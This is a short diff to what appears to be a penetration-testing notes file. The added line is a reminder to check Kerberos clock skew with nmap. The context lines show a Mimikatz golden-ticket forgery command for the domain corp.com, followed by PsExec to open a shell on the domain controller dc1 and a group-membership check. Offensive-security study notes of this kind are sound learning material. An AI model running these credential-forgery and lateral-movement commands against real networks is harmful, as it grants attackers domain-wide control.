@@ -176,6 +176,9 @@ kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1
 misc::cmd
 PsExec.exe \\dc1 cmd.exe
 whoami /groups                    # will be in Admin Group
+
+#time check 
+check for clock-skew through nmap 
 ```
 
 ### vshadow.exe
